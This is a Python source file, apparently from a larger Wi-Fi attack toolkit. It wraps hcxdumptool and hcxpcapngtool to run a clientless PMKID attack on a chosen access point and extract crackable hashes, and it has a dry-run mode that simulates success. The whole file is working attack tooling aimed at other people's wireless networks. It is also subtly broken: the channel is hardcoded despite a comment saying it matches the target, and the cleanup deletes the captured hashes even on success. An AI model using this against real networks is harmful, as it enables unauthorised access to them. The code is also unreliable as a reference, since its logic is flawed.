import subprocess
import time
import random
from core.logger import log

class HCXDumptoolWrapper:
    def __init__(self, dry_run=False):
        self.dry_run = dry_run

    def capture_pmkid(self, interface: str, target_bssid: str, duration: int = 30) -> bool:
        """
        Runs hcxdumptool to capture PMKID (clientless attack).
        """
        log.info(f"Running hcxdumptool on {target_bssid} for PMKID...")
        
        if self.dry_run:
            time.sleep(2)
            # Simulate PMKID capture success rate (~70% on modems)
            return random.random() < 0.7

        # Create a temporary filter file for the specific BSSID
        filter_file = f"/tmp/filter_{target_bssid.replace(':', '')}.txt"
        with open(filter_file, 'w') as f:
            f.write(target_bssid + '\n')
        
        cmd = [
            "hcxdumptool",
            "-i", interface,
            "--filterlist_ap=" + filter_file,
            "--enable_status=1",
            "--filtermode=2",  # Only capture from filtered APs
            "-c", str(1),  # Set channel to match target
            "-t", str(duration),
            "-o", f"/tmp/pmkid_{target_bssid.replace(':', '')}.pcapng"
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration+5)
            
            # Check if PMKID was captured by examining the pcap file
            import os
            pcap_path = f"/tmp/pmkid_{target_bssid.replace(':', '')}.pcapng"
            if os.path.exists(pcap_path) and os.path.getsize(pcap_path) > 0:
                # Check if the capture contains PMKID frames using hcxpcapngtool
                hcx_check_cmd = [
                    "hcxpcapngtool",
                    "-k", f"/tmp/pmkid_{target_bssid.replace(':', '')}_hashes.txt",  # PMKID hashes output
                    pcap_path
                ]
                
                check_result = subprocess.run(hcx_check_cmd, capture_output=True, text=True)
                if os.path.exists(f"/tmp/pmkid_{target_bssid.replace(':', '')}_hashes.txt"):
                    hash_size = os.path.getsize(f"/tmp/pmkid_{target_bssid.replace(':', '')}_hashes.txt")
                    if hash_size > 0:
                        log.info(f"PMKID successfully captured for {target_bssid}")
                        return True
            
            return False
        except subprocess.TimeoutExpired:
            log.warning("hcxdumptool timed out")
            return False
        except Exception as e:
            log.error(f"HCX Tool failed: {e}")
            return False
        finally:
            # Clean up temporary files
            try:
                import os
                if os.path.exists(filter_file):
                    os.remove(filter_file)
                pcap_path = f"/tmp/pmkid_{target_bssid.replace(':', '')}.pcapng"
                if os.path.exists(pcap_path):
                    os.remove(pcap_path)
                hash_file = f"/tmp/pmkid_{target_bssid.replace(':', '')}_hashes.txt"
                if os.path.exists(hash_file):
                    os.remove(hash_file)
            except:
                pass  # Don't worry about cleanup errors
